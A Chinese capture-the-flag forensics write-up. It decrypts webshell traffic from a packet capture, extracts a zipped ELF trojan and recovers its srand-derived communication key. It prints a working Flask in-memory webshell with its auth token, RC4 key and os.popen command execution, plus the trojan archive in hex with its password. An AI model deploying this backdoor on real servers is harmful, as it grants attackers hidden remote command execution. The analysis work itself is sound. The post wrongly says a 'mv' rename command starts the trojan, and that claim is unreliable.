<pre><code class="hljs">攻击者上传了一个二进制后门，请写出木马进程执行的本体文件的名称，结果提交形式：flag{xxxxx}，仅写文件名不加路径
</code></pre>
<p>我们来分析上一题我们得到的shell代码</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">global</span> exc_classglobal codeimport os,binasciiexc_class, code = app._get_exc_class_and_code(<span class="hljs-number">404</span>)RC4_SECRET = <span class="hljs-string">b'v1p3r_5tr1k3_k3y'</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_crypt</span>(<span class="hljs-params">data: <span class="hljs-built_in">bytes</span>, key: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:        S = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))        j = <span class="hljs-number">0</span>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):                j = (j + S[i] + key[i % <span class="hljs-built_in">len</span>(key)]) % <span class="hljs-number">256</span>                S[i], S[j] = S[j], S[i]        i = j = <span class="hljs-number">0</span>        res = <span class="hljs-built_in">bytearray</span>()        <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> data:                i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span>                j = (j + S[i]) % <span class="hljs-number">256</span>                S[i], S[j] = S[j], S[i]                res.append(char ^ S[(S[i] + S[j]) % <span class="hljs-number">256</span>])        <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(res)<span class="hljs-keyword">def</span> <span class="hljs-title function_">backdoor_handler</span>():        <span class="hljs-keyword">if</span> request.headers.get(<span class="hljs-string">'X-Token-Auth'</span>) != <span class="hljs-string">'3011aa21232beb7504432bfa90d32779'</span>:                <span class="hljs-keyword">return</span> <span class="hljs-string">"Error"</span>        enc_hex_cmd = request.form.get(<span class="hljs-string">'data'</span>)        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> enc_hex_cmd:                <span class="hljs-keyword">return</span> <span class="hljs-string">""</span>        <span class="hljs-keyword">try</span>:                enc_cmd = binascii.unhexlify(enc_hex_cmd)                cmd = rc4_crypt(enc_cmd, RC4_SECRET).decode(<span class="hljs-string">'utf-8'</span>, errors=<span class="hljs-string">'ignore'</span>)                output_bytes = <span class="hljs-built_in">getattr</span>(os, <span class="hljs-string">'popen'</span>)(cmd).read().encode(<span class="hljs-string">'utf-8'</span>, errors=<span class="hljs-string">'ignore'</span>)                enc_output = rc4_crypt(output_bytes, RC4_SECRET)                <span class="hljs-keyword">return</span> binascii.hexlify(enc_output).decode()        <span class="hljs-keyword">except</span>:                <span class="hljs-keyword">return</span> <span class="hljs-string">"Error"</span>app.error_handler_spec[<span class="hljs-literal">None</span>][code][exc_class]=<span class="hljs-keyword">lambda</span> error: backdoor_handler()
</code></pre>
<p>这段代码是一个典型的<strong>Python 内存马</strong>，它被挂载在 Flask 等框架的 404 错误处理句柄上</p>
<p>要找到攻击者上传的<strong>二进制后门文件名</strong>，从流量分析入手，利用这段代码提供的加密逻辑进行解密</p>
<p>HTTP 请求头中包含 X-Token-Auth: 3011aa21232beb7504432bfa90d32779，攻击命令通过 POST 参数 data 传递，数据格式为十六进制字符串</p>
<p>采用了 <strong>RC4</strong> 算法，关键密钥：v1p3r_5tr1k3_k3y，解密后的命令通过 os.popen(cmd) 执行，结果再次 RC4 加密并以 Hex 形式返回</p>
<p>那我们可以在 Wireshark 或流量分析工具中，筛选出符合以下特征的流量：</p>
<pre><code class="hljs language-sql" lang="sql">http <span class="hljs-keyword">contains</span> "X-Token-Auth"
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/edf21eb5cd09472282c1bb20254ce94d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6JqB5pmv572R5a6J5a6e6aqM5a6k:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768874375&amp;x-signature=qS6LOitWpe7war0O1lcLmzRB0Kg%3D" alt="" loading="lazy"/></p>
<p>找到那些 POST 请求，复制 data 参数后面的十六进制字符串，带入到以下脚本一个个去试</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-selector-tag">import</span> <span class="hljs-selector-tag">binasciidef</span> <span class="hljs-selector-tag">rc4_crypt</span>(<span class="hljs-attribute">data</span>: bytes, <span class="hljs-attribute">key</span>: bytes) <span class="hljs-selector-tag">-</span>&gt; <span class="hljs-selector-tag">bytes</span>:    <span class="hljs-selector-tag">S</span> = <span class="hljs-selector-tag">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))    <span class="hljs-selector-tag">j</span> = <span class="hljs-number">0</span>    <span class="hljs-selector-tag">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-selector-tag">in</span> <span class="hljs-selector-tag">range</span>(<span class="hljs-number">256</span>):        <span class="hljs-selector-tag">j</span> = (j + S[i] + key[i % <span class="hljs-built_in">len</span>(key)]) % <span class="hljs-number">256</span>        <span class="hljs-selector-tag">S</span><span class="hljs-selector-attr">[i]</span>, <span class="hljs-selector-tag">S</span><span class="hljs-selector-attr">[j]</span> = <span class="hljs-selector-tag">S</span><span class="hljs-selector-attr">[j]</span>, <span class="hljs-selector-tag">S</span><span class="hljs-selector-attr">[i]</span>    <span class="hljs-selector-tag">i</span> = <span class="hljs-selector-tag">j</span> = <span class="hljs-number">0</span>    <span class="hljs-selector-tag">res</span> = <span class="hljs-selector-tag">bytearray</span>()    <span class="hljs-selector-tag">for</span> <span class="hljs-selector-tag">char</span> <span class="hljs-selector-tag">in</span> <span class="hljs-selector-tag">data</span>:        <span class="hljs-selector-tag">i</span> = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span>        <span class="hljs-selector-tag">j</span> = (j + S[i]) % <span class="hljs-number">256</span>        <span class="hljs-selector-tag">S</span><span class="hljs-selector-attr">[i]</span>, <span class="hljs-selector-tag">S</span><span class="hljs-selector-attr">[j]</span> = <span class="hljs-selector-tag">S</span><span class="hljs-selector-attr">[j]</span>, <span class="hljs-selector-tag">S</span><span class="hljs-selector-attr">[i]</span>        <span class="hljs-selector-tag">res</span><span class="hljs-selector-class">.append</span>(char ^ S[(S[i] + S[j]) % <span class="hljs-number">256</span>])    <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">bytes</span>(res)<span class="hljs-selector-tag">SECRET</span> = <span class="hljs-selector-tag">b</span>'<span class="hljs-selector-tag">v1p3r_5tr1k3_k3y</span>'#  <span class="hljs-selector-tag">data</span> 字符串填在这里<span class="hljs-selector-tag">enc_hex_cmd</span> = "这里填流量包里的<span class="hljs-selector-tag">hex</span>字符串" <span class="hljs-selector-tag">enc_cmd</span> = <span class="hljs-selector-tag">binascii</span><span class="hljs-selector-class">.unhexlify</span>(enc_hex_cmd)<span class="hljs-selector-tag">cmd</span> = <span class="hljs-selector-tag">rc4_crypt</span>(enc_cmd, SECRET)<span class="hljs-selector-class">.decode</span>(<span class="hljs-string">'utf-8'</span>, errors=<span class="hljs-string">'ignore'</span>)<span class="hljs-selector-tag">print</span>(f<span class="hljs-string">"Decrypted Command: {cmd}"</span>)
</code></pre>
<p>解密 1814 流的 Data：</p>
<ul>
<li>
<p><strong>Payload</strong>: bab6694ba3c9...</p>
</li>
<li>
<p><strong>解密结果</strong>: unzip -P nf2jd092jd01 -d /tmp /tmp/123.zip</p>
</li>
<li>
<p><strong>性质判定</strong>：这是一个<strong>系统命令</strong>，调用系统自带的 unzip 工具，它是在<strong>准备环境</strong>，不是在运行木马本体</p>
</li>
</ul>
<p>解密 1817 流的 Data：</p>
<ul>
<li>
<p><strong>Payload</strong>: a2ae330da7846599188b26257a88f10b50790cb47e6a97177e1053c351</p>
</li>
<li>
<p><strong>解密结果</strong>: mv /tmp/shell /tmp/python3.13</p>
</li>
<li>
<p><strong>性质判定</strong>：</p>
<ul>
<li>
<p>这里出现了一个<strong>绝对路径</strong> /tmp/python3.13</p>
</li>
<li>
<p>它不是系统自带命令，Linux 并没有 python3.13 这个原生标准路径，且系统本身运行的是 3.12</p>
</li>
<li>
<p><strong>定性</strong>：这行命令的作用是<strong>启动一个特定的二进制文件并让它持续驻留</strong>，这完全符合执行木马本体的行为定义</p>
</li>
</ul>
</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b84ae436d7b24aa0b8939067e0662c53~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6JqB5pmv572R5a6J5a6e6aqM5a6k:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768874375&amp;x-signature=OCrBg6lk1lfaOjKj5YWlgATarb8%3D" alt="" loading="lazy"/></p>
<p>flag{python3.13}</p>
<h2 data-id="heading-5">5.SnakeBackdoor-5</h2>
<pre><code class="hljs language-css" lang="css">请提取驻留的木马本体文件，通过逆向分析找出木马样本通信使用的加密密钥（hex，小写字母），结果提交形式：flag{<span class="hljs-selector-attr">[0-9a-f]</span>+}
</code></pre>
<p>根据上题，1813流是在解压，所以可以提取流量包中传输的123.zip，所以往前翻，翻到1807流</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d564f243b4ec4240a37ea6934bb26706~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6JqB5pmv572R5a6J5a6e6aqM5a6k:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768874375&amp;x-signature=39YAECafRA%2B67J7gbuM3wdsbpUY%3D" alt="" loading="lazy"/></p>
<p>PK开头就是有.zip压缩包了，显示选择为原始数据</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/40a3741306b84f99826e22a3cb1852aa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6JqB5pmv572R5a6J5a6e6aqM5a6k:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768874375&amp;x-signature=Um3rqYUYi6mREa%2Br%2F1Jk%2Bt6n36Y%3D" alt="" loading="lazy"/></p>
<p>将504b开头那些东西都复制下来保存到.txt文件内，通过以下脚本进行一个提取</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">import</span> binascii#那段长十六进制字符串hex_data = <span class="hljs-string">"504b03041400090008002431955be01c1a3483100000f838000005001c007368656c6c555409000354d547695ad5476975780b000104000000000400000000b513d2ddc97797c8b164bf85a8cfb6162732440e1431884df99aae322636568e2824d8eadc31815e8d6b5dda1fc3d6ee45e91146de5248d321d8b87c65e27269dddb8aa41496c9acfec533833226e162c40d9404b301751a6cca6a52adea3f175b4b0f2c11989600b9fc2c8a007e393962dc264416f07e3232ca03fd484421c638aa6079b54493a1c10e86de01a10ab08fbf7bbb2b5232b139dbec9e22312e3ecd22f5f1e6eed431dad7a8ec8e5938dedca24c38f4d2df50d34a88c5d6e51f156612f990f0a30c8aac7e91e6ab68ec994d332fd9392f47b3d513d684a913dfb2be73216fe3a1314cb4cfb6746bd1061198731e792596c74dc7c81caa67e136aa9838e6d8def8a79329971d934425be0202850e19571f340229e64d186e570fdb6da66531d7e9adb508a8f28442c42a711bb950c9952aa3b4c20ba46bb7bbfe024268e068c9a93ce45c6764b8d879ea1460271c73b29ea5dc8b79251ff941302e2f6060c851074e631cd489d1978c83cc85d01c4111d78cc99985f6231c406694d33d94759667346d566d97f5e31c6f6694e017927bbacd853ca588276a105eab80e9eb7b039c4cfb7c1a023cb9686cd4a28d977bb09e14dc5a53cf3c0247abbf8a120050ea28b2a25779a997e5b738c4fe6f6b39d7d3a7b926be1c727f43971c7116b9fb7dbbfa2770b7aa250cf5c7764c1756ad7bfbe3fc838ad20c6dc7aa9ad7a60cc4c5c988fcb1ad7b2d93719855c155908db4f19e5725c1f7052ae9e226e46e716501b49599648a8492eb1e7f8e340ea7c0127affc890c359284a61a7ad7159f591afdae771c6ee6d82b4a1c3c8bdcb6fd42649ba37a41e3f20c8d7f70c1166161884a5e74cf5b4991992310fcadd61c599884b8d982809bc6bb776236c10642f9fa0b513b731431c269853bebbd9920468397c3f0d7587f05500550bf7096e054b3e541006d22620d73d0fc018eb760042878362eb1fd7090157a6713774fa5fdf5b5e6cc11cf945427121029e9ba66f7b1f3e93832d1434687c720f6ab52d1f979d590eaf6ade5ee8685259afc823ca12a6382bd3bd46e674f9914cf1a4e4c4ee3d6699fbdb28934aa1de1a33d5a9a9c65d74314d8e9c667f01e881b58757897486b66ee3ccbb114bf61a652115660b3b65f08da901554c63e9fdceca137b1c3161c2a27bec3b3d3ced97630c980611f8ea13611a3a8520e6b9dc430ca91f60aa65ac52355fbff0ccbbef479e60f3d217be6ca580b4f9fa315b681467cb1dc3348a23889685e0274fd5f16cc153d0dfe862fa54feea077eaf8a10a0d13aa54dbfde88d689bfae3f716d303f14d08139fe3d6528e2aad3fa28f3d4ce91b54e3589bfe4f73c73e7ec963fb4265104e5393fa1ad407bc4aea65c75dd83787e2b782ad0587032730a860d15054ce554645ce2e8fda849adc619b2c09242f420befebf279bb3c1e8716e431cf2b89caa849e76c3cddf20944c43731aee2ae257292704589ee9d93654b72d4ee4daf95f0c58ac33cf2d7d5a9123f6cdab29475465c6c4643adc7eb9301f3f30048463a2c11f7c7efd30eac836ec8a62690f24d010af11974f58b66467cc7f3294ceccb0496b381ed3774dac4642b6ecd3b05214cfd67756c8f90c5380f61fba3a0be60c723e0b9a8a1ab291f214b06410dd834f0326d2961cdf1a8906807d8e82492ad63151f2a18dd5d527b151b5e7219d824c8c7b18de38d0ca7117a321f689ed9cf00b90f37cf42fcc34327fd6763b95a33cfcdd941cfe3fd5fd1a7b6a164135ba5b9e015902315c93d73ade804c42a6b3c7f1f6d76141397f6867167edca1d2ae3de618647d7e283554df51accd77418644087f8a0d1d6bd37e30f9c387e5c86c747e483b1bac9bdfeef360c59ba2cc8c31b5e58b30e004ebddd26ade10fbc0c27c1e8b883c72a92a7645a2910a79f665f4b106e9188a14436c567f51ea48f94ff2283f9cc1f13aeb55e25e6c517bf41073f3cf610c2119f065eb0d29982b3d81b5af4dc84a11d17c7b328ad83253c3d4d099674bc5632b8e4d79188268e420171b51b789491c82d4fb543bee92182a0287a61797d99e034bcb8ce72942884fef00fed929747e526d463e66961e48e9ea66048d8b42f7bedd5fc9c80c7fbe09c1a1c0d84111d71f34bef352287345bad7e417c8a3c43b8582f6410fe2091feb73548ee05a9eebde8b310817cdeade38a5736161bfc8f9453f7cc80a2f2dbf5ac2c83f489424719276bcd7b238249157cb40d2715dc46b3f7acc1520148ee03430c2a7da27e3d4d204178cb4ba2d378e2fe8aaea895251de970cda7dfa00aaef5eaa2f2673663d880983d9fa6cdf6aeeeba99bb1b2bf774a9685b13b8aec015e1782e31c5582125445c1f3b314912e93c6677be910ae19b3c4237c417beafb7acd13c85fde3f2d517c00e302f7bfc60bb967b4f4e00e6f53ca2a3125b7b260e5cb311f41449ce394a7c164830836b516d246c1afaf7c0c39c082e7a8d2ee66374b7d8c37db77f634c22025fad64a6df59d41ce4c5191517b821c5e7e2238e92948f10f17088935d976e2ed1986eef61bc0c481c5f4dfc4e809dd642712290ae75e80454e132e1051e4fe1554ef49ec33afbfc978e3c72b7b1f7c494bec23d342a8821f1eb5d9749d82d37d8de9bd33bdc81fdcee09bd532b0a131711126c47e90e32ea3cbdfe594717e05983b50df59150d7e5a15cd618a9866ec18aee3262f3b5bebd30b459c004d30bfcb0f360b7d352169e647a7c287db39b79fc4ceae70b2cf8c7658868a2c62aecd65e525b4e0dc3de33940691361bbb905d0eddd67f40f09170c314206b5c6504edbaaa92bb41495d8422b546de33415234f282a60121ff6621a3574e693c7525893bc55f2017c117ae699b315e98f48729229b55ee72d7ef1e3e81a82369796e95aa2a6bd1c04dd69ec76748564859f3226d8291782d7f39120da7cd4f84c75db5530bb4ff9ec55404d68061ede3bc81409f56f1306b9aa5da184ec4c1d88d89663a4777a359a4dcec516243950cefb912563a81b916f719c4b70b3ae5147fbaf0abb87b799f17fca39564b12f9ec1e14c7f1a24e0893fcbeb864bef56f72b9801867ac327d4e9df67e044a60c0c44eac4db6589e1937762925328debd3ee0033a7e7e28e82248b07f263a1a8fdce1c72ecff1b814977edc5ca76bffb7fc22207c856a018891127ad857548e25398cfa997ff603eb5ae6be0edc690614cf183d6a19310bfc9de10f3b2ec0aba9448127360baf508d8fe1a661e819ad96028bdd1fd88350571fb522993c23aa6af907ab063cc27b3e9ce1edc9d8126bebf17182ec066d65e0801f026485100c66b14b26876570d1ef4b61bb3d2c0bd137d6744e092ede9bfd2f532993cdd8bdadeb4a237cbaae27f57d10e81ef26dfe81a8df41c5f5e5e6170a1212dcd4bf162dbf51e0d89b5929a7a852f762407591bca0ffde5aaa876ec030686080581a88813430800e0b35cf8583c0587184a81eadac8ba97fc3690718667154eeb64faf290a4b302bd782acd35e86675ea0560f42980596bd4357592b4c8328c08fe06a07ffe40d823ca76de71c667e1f687985bfe1a8516a634f3a2329e2037dd74a6044e0fc4a35f29e50b0fd9910fa26a2aa6608166b4e105587fb1ec7152f4e31dae57392978512d263c6ab623df7258df18e5b961f0637d5f1cccad010595c7e9d26c0f46f5ab7565c207dcfd89eecacad59f819fa93a4ed7025b035c2c3c42116c455615612bbc05c29540ffeae786afad4417948fffa8723489716aaf2f133c3b34de35e82901e9748046c9367f8ec30153982981a8e0e3ac1e6774dcd7c93219216bcad1a367452bdd5e672df506b185a3181c51cab3d2e6066f68fbea7e7f8a9cf4b9fae41bb0331fc06a1311f02feda19fe6e2b06bc22f700da588677f6d2c4b8e82502198e5113a6c7ed984b82a97e5639e2e2ef3aaf24ba348f33ada85f25ef7523a45918150589fc61b93183f18c99656711a2c75baaa0b9eaceb21b576a1276d3a4f807dabbf51d25d464f6228e93dc1b96a10bf3342ef268b85fbfd816aa9c61180ed7ef55b2d0738a4ddaf76b02b381e8f339030d53d64344772c56a251331eefeee7edd4bb28ad7e6687f724354c45b7266072c2e3da8939bf34fbebfd0de204033088205c4c671584a9979ab628fd2dc4d7ab8d57a25bd9b064018f000fd21b4023ac94736bef5701505e2ea75e0670931a325b296f3447787268ce000a45c43fa79b873828d5c0cfbf8403f0e3ae320d025552f090d6e4460930c35726f97a7d8505ef88dbf3248f3944b9e00e60d77b7537555221a7d8b9f20ceafe369ac7519cdc8fcaad00d63ffd58e624cb1e3a2fde7870faf58e4c25ac3fa548b742749389f3417df80abdd2dd66bebe976f03e3e1cd08a19e2cdd86e3d4bd7230b208ea7b482b226c9f47011cff59a765ab7a1c52b7e62f4b88b080ce688714ea00bcd4c5e603c7a2e73eed1795d8958bc16e9457020585d46c2c210d407caca8925746ba8a9dc67903a86c5e883ecf0a4103b5f742bb7275e60a1ae326349f73c9754fe78e1fa2012c9ffd04a6b6a2019e6aff4e1195441630f1d7b919922ed16fc7a06dd08c7df59c9729af49fd5f325af9712a982c5b2d499e3efd1fdb37d2df4977a0786debc7dee8082406ea3474b840742f53b51ef2c8197a4033ae04f5ee3652e6eeb1c33943e3748f16b12bf20de2c983fb7bee1ad6801e867f3da272364b21653b460effcb781b34119903895b3daf8e0783b9bd27d73d56a2294f428fb532d2330738c2f59948ed049312f238f99a9daf3d38db6afe1b406f608399cd837875828dd8aa44070efcd131f5f976d224e7e7022bdf17e1bebd05e9d98637e27c732dd6a4660cf59b7a9e32aa8e33837919f86b9f60bcb53926c40b7e3134cf95673e7e579ed81991a64d3a2bc9677daf2e7acaa33a50aa4249932545ae4195d8a13683f3460bbc3bbeded28c58d50ce63bdddda4a5d0d894a5c704443c013e53393d887f8407e0332ce41e462d41d7f81ff0fe095f0feb0cb789f40a033356bbb63bd4519cbfd772d85ecb244b6740ef554377d57b9c9f0fdb9ed11e5d72e7e28d66fd34130b70fee6cbd0469cd9927eefb844b2286a45b6023a682621d3672619e57bcce26c0dc39117ac8d04c3b3ec7f639d9379ec5cc0b313ab62bbfe8198b60573fe96c4f4b13196462c39d3bd79b5a152211eca5fce5bc02d15b4d385e5de668c927dd4d0f7c6f0bd9898b9a110571f1d3c98796b9534f0c40327dfc5bb70e0aff89845a12038e31cc63107885582818abf94ec6a9b36655f8e1541e06dccb929b1fc28f2825a13bc13e9ccee304394f3cdfa18179f5aed4059482c889609867fdf0babd73735e583eb4886bb9f4ef71ca57a51f7b70b0e9157ea2fda7dc990879d5ebd240a6c6d2ced45219a56c9ebe334a38d8ebb5ba8b3c46575ca42336153394328d6f454f10a146590422b94b64f291240be27e8d653ff92390dd71302af099e50e1c06b16ab12795d687d30effe49343f90604b7691580acb7e4564f58d31835ea7cf3a505f09fe3c2df6a6a5bc3d311a8bf3f26fe8572828837d821b38cf4fd6f2421a4e496fae5fcb04b9f1ae53991838327822e5ca84976cb70c8ae1da7c2b6ccd65659bda0bda09615e54e952ed46ad9363cbb455db1cd00263f047455c2143517bf48b64b39e279ba576730a2aa84f3f9bced6fc04836500c85b61e8d6e946c3e0fb21299157e26d619e8d623af1597f9d02932ef664a1125800247eb55c820e9f9123f9176bbc66bc23ee91b452621d1e33d43f0cdf20d6e4f1f1f2ae3de204a5284453ac8e383824be409f9f3b0ef7c7ce10e577c360dad017efe5e6e755bb3b1f7a497d3be835a13251942cf828fcb8cb5cb18d19c219a67d16ed6030161c6e1ac828bab5d1599fe9917d69f530ce504b0708e01c1a3483100000f8380000504b01021e031400090008002431955be01c1a3483100000f8380000050018000000000000000000ed81000000007368656c6c555405000354d5476975780b000104000000000400000000504b050600000000010001004b000000d21000000000"</span># 转换并写入文件<span class="hljs-keyword">with</span> open(<span class="hljs-string">"shell.zip"</span>, <span class="hljs-string">"wb"</span>) <span class="hljs-keyword">as</span> f:    f.write(binascii.unhexlify(hex_data))<span class="hljs-built_in">print</span>(<span class="hljs-string">"提取成功：已保存为 shell.zip"</span>)
</code></pre>
<p>发现解压需要密码，而根据1813流解出来的指令</p>
<pre><code class="hljs language-bash" lang="bash">unzip -P nf2jd092jd01 -d /tmp /tmp/123.zip
</code></pre>
<p>密码就是nf2jd092jd01，解压缩出东西来，然后ida启动，进入到main函数来</p>
<p>首先是木马尝试连接到控制端 IP 192.168.1.201，端口 58782</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a5056f0ff4ad460f907aab72d7f0fcd4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6JqB5pmv572R5a6J5a6e6aqM5a6k:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768874375&amp;x-signature=vjIdbEkfU9QcFYfF3D13y6oWWRU%3D" alt="" loading="lazy"/></p>
<p>连接成功后，木马首先调用 sub_18ED 从服务器接收 <strong>4 个字节</strong>的数据存入 v7</p>
<p>代码对 v7 进行了字节序转换，大端转小端或反之，并将其作为 seed</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fc470df2664c443d89c4fb449e59f07a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6JqB5pmv572R5a6J5a6e6aqM5a6k:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768874375&amp;x-signature=EWcvxnVb8fMTAqlP1ALzD4uEXz0%3D" alt="" loading="lazy"/></p>
<p>调用 srand(seed) 初始化随机数生成器，通过循环 <code>for ( i = 0; i &lt;= 3; ++i ) v8[i] = rand();</code> 生成 4 个随机整数，一共16个字节</p>
<p>这里的 v8 数组就是后续对称加密算法，比如 AES使用的原始密钥</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a65eedbe54f34f60a8bcd8831ccf6171~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6JqB5pmv572R5a6J5a6e6aqM5a6k:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768874375&amp;x-signature=x3y%2FwUAYGyJvxZF0BsyjLXYD%2FoA%3D" alt="" loading="lazy"/></p>
<p>sub_13B4(v10, v8, 0LL)：使用 v8 初始化解密状态，用于处理收到的指令</p>
<p>sub_13B4(v9, v8, 1LL)：使用 v8 初始化加密状态，用于加密返回的结果</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8ec3a6244bf1464782d8572c40515dc6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6JqB5pmv572R5a6J5a6e6aqM5a6k:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768874375&amp;x-signature=YyNqT4oBTYSTHYouOxcVkK%2B65R8%3D" alt="" loading="lazy"/></p>
<p>题目要求提交的是木马样本通信使用的加密密钥</p>
<p>根据代码，密钥是动态生成的，依赖于服务器发送的第一个 4 字节种子</p>
<p>在流量包中找到与 192.168.1.201:58782 的 TCP 流</p>
<p>找到 TCP 三次握手之后的第一条数据包，由服务器发往木马客户端</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7c870d37f98f4deabd7b449ecd4ff9df~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6JqB5pmv572R5a6J5a6e6aqM5a6k:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768874375&amp;x-signature=zGAlqsvjBJZpWFreOuCT2z2Igl0%3D" alt="" loading="lazy"/></p>
<p>提取这前 4 个字节</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3e2287d2ac9f40c0995e244e4cff74fa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6JqB5pmv572R5a6J5a6e6aqM5a6k:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768874375&amp;x-signature=g6AusdzyFrDJtUNV2AJhfDdEC6I%3D" alt="" loading="lazy"/></p>
<p>因为由于该木马是 ELF 文件，它调用的 rand() 函数遵循的是 <strong>Linux glibc</strong> 的随机数生成算法</p>
<p>Python 自带的 random 库使用的是 Mersenne Twister 算法，与 C 语言的 rand() 完全不同</p>
<p>因此，Python 脚本必须通过 ctypes 库调用 Linux 系统的标准 C 库（libc.so.6）来获取一致的结果</p>
<p>但是我搞了好久也没有搞定，最后决定直接用C语言写得了</p>
<pre><code class="hljs language-sql" lang="sql">#include <span class="hljs-operator">&lt;</span>stdio.h<span class="hljs-operator">&gt;</span>#include <span class="hljs-operator">&lt;</span>stdlib.h<span class="hljs-operator">&gt;</span>#include <span class="hljs-operator">&lt;</span>stdint.h<span class="hljs-operator">&gt;</span><span class="hljs-type">int</span> main() {    <span class="hljs-operator">/</span><span class="hljs-operator">/</span>  <span class="hljs-number">0x34</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x46</span>    <span class="hljs-operator">/</span><span class="hljs-operator">/</span> 在小端序机器上，这 <span class="hljs-number">4</span> 个字节组成的 <span class="hljs-type">int</span> v7 <span class="hljs-operator">=</span> <span class="hljs-number">0x46209534</span>    uint32_t v7 <span class="hljs-operator">=</span> <span class="hljs-number">0x46209534</span>;     <span class="hljs-operator">/</span><span class="hljs-operator">/</span> <span class="hljs-number">2.</span> 模拟 IDA 中的字节序转换逻辑    uint32_t seed <span class="hljs-operator">=</span> ((v7 <span class="hljs-operator">&gt;&gt;</span> <span class="hljs-number">8</span>) <span class="hljs-operator">&amp;</span> <span class="hljs-number">0xFF00</span>) <span class="hljs-operator">|</span>                     ((v7 <span class="hljs-operator">&lt;&lt;</span> <span class="hljs-number">8</span>) <span class="hljs-operator">&amp;</span> <span class="hljs-number">0xFF0000</span>) <span class="hljs-operator">|</span>                     (v7 <span class="hljs-operator">&lt;&lt;</span> <span class="hljs-number">24</span>) <span class="hljs-operator">|</span>                     ((v7 <span class="hljs-operator">&gt;&gt;</span> <span class="hljs-number">24</span>) <span class="hljs-operator">&amp;</span> <span class="hljs-number">0xFF</span>);     printf("[*] Calculated Seed: 0x%08x\n", seed);    <span class="hljs-operator">/</span><span class="hljs-operator">/</span> <span class="hljs-number">3.</span> 初始化随机数 (Linux 环境下的 srand)    srand(seed);    <span class="hljs-operator">/</span><span class="hljs-operator">/</span> <span class="hljs-number">4.</span> 生成 <span class="hljs-number">16</span> 字节密钥 v8    uint32_t v8[<span class="hljs-number">4</span>];    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i <span class="hljs-operator">&lt;=</span> <span class="hljs-number">3</span>; <span class="hljs-operator">+</span><span class="hljs-operator">+</span>i) {        v8[i] <span class="hljs-operator">=</span> rand();    }    <span class="hljs-operator">/</span><span class="hljs-operator">/</span> <span class="hljs-number">5.</span> 按内存顺序输出 hex    unsigned <span class="hljs-type">char</span> <span class="hljs-operator">*</span>ptr <span class="hljs-operator">=</span> (unsigned <span class="hljs-type">char</span> <span class="hljs-operator">*</span>)v8;    printf("flag{");    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i <span class="hljs-operator">&lt;</span> <span class="hljs-number">16</span>; <span class="hljs-operator">+</span><span class="hljs-operator">+</span>i) {        printf("%02x", ptr[i]);    }    printf("}\n");    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}
</code></pre>
<p>找个C语言在线编译网址就可以了</p>
